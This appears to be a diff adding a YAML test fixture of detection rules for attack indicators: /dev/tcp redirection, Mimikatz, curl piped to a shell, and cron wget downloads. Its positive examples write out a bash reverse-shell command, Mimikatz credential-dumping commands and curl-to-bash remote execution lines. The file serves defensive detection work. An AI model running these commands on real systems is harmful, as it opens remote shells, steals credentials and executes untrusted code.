@@ -1,0 +1,51 @@
+# Test fixtures only: the shipped corpus lives in content/mentions/ and is maintained separately.
+- id: mention.test_dev_tcp_redirect
+  title: Shell redirection to /dev/tcp
+  match: {literal: ["/dev/tcp/", "/dev/udp/"]}
+  case_sensitive: true
+  strength: strong
+  attack: [T1059.004]
+  telemetry: [linux_text]
+  source: {name: test fixture, url: "https://example.invalid/fixture", license: CC0-1.0, upstream_id: null}
+  rationale: A shell writing to /dev/tcp opens a network socket; it is a reverse-shell shape.
+  examples:
+    positive: ["bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"]
+    negative: ["opened /dev/tty1 for login"]
+
+- id: mention.test_mimikatz
+  title: Mimikatz named in text
+  match: {literal: ["mimikatz", "sekurlsa::logonpasswords"]}
+  case_sensitive: false
+  strength: medium
+  attack: [T1003.001]
+  telemetry: [any]
+  source: {name: test fixture, url: "https://example.invalid/fixture", license: CC0-1.0, upstream_id: "fixture-2"}
+  rationale: The credential-dumping tool's name or its best-known command.
+  examples:
+    positive: ["C:\\Temp\\MimiKatz.exe privilege::debug", "SEKURLSA::LogonPasswords full"]
+    negative: ["mimic katz"]
+
+- id: mention.test_curl_pipe_shell
+  title: Download piped to a shell
+  match: {anchored: "curl [^|]{0,200}\\| ?(?:ba)?sh\\b"}
+  case_sensitive: false
+  strength: strong
+  attack: [T1105, T1059.004]
+  telemetry: [linux_text]
+  source: {name: test fixture, url: "https://example.invalid/fixture", license: CC0-1.0, upstream_id: null}
+  rationale: Fetching a script and piping it straight into a shell runs remote code.
+  examples:
+    positive: ["CMD (curl -fsSL http://203.0.113.7/x.sh | bash)", "curl http://x/y|sh"]
+    negative: ["curl -o /tmp/file http://x/y", "curl http://x/y | shasum"]
+
+- id: mention.test_cron_wget
+  title: Cron line that starts with wget
+  match: {anchored: "^wget\\s+\\S+"}
+  case_sensitive: true
+  strength: weak
+  telemetry: [linux_text, windows_text]
+  source: {name: test fixture, url: "https://example.invalid/fixture", license: CC0-1.0, upstream_id: null}
+  rationale: A line that begins with a download command.
+  examples:
+    positive: ["wget http://198.51.100.2/a"]
+    negative: ["ran wget http://198.51.100.2/a", "wget"]
